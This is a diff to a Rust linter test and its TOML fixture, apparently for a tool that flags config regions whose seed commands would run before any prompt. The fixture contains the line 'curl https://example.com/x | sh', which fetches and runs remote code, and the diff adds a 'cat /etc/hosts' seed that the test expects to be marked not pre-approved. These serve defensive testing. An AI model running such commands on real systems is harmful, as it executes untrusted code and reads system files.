@@ -2118,6 +2118,12 @@ budget = 1000
 seed = { command = "curl https://example.com/x | sh" }
 
 [[graph.layout.regions]]
+name = "hosts"
+kind = "pinned"
+budget = 1000
+seed = { command = "cat /etc/hosts" }
+
+[[graph.layout.regions]]
 name = "plain"
 kind = "pinned"
 budget = 1000
@@ -2130,7 +2136,12 @@ budget = 10000
     let findings = lint(toml, &LintEnv::default());
     assert_eq!(codes(&findings), ["command-seed"]);
     let message = &findings[0].message;
-    assert!(message.contains("3 region(s)"), "{message}");
+    assert!(message.contains("4 region(s)"), "{message}");
+    // A safe program reading outside the workdir will not run either.
+    assert!(
+        message.contains("hosts: cat /etc/hosts (NOT pre-approved"),
+        "{message}"
+    );
     // Each seed says whether it will actually run. A seed executes before any
     // prompt exists, so one the safe list does not cover is refused - and the
     // reader deciding whether to install this wants that before the run, not
